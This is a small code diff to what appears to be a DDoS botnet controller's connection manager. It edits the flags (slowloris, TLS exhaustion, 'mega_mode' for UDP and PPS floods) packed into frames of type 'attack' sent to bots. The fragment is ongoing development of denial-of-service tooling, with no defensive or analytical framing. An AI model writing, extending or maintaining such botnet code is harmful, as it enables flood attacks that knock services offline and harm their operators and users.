@@ -148,7 +148,7 @@ class BotConnectionManager:
         flags = {
             "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
             "tls_exhaust": 1 if method in ("TLS", "TLS_EXHAUST") or task.get("tls_exhaust") else 0,
-            "mega_mode": 1 if method in ("PSPE", "MEGA") or task.get("mega_mode") else 0,
+            "mega_mode": 1 if method in ("MEGA", "UDP", "PPS") or task.get("mega_mode") else 0,
         }
         frame = {
             "type": "attack",
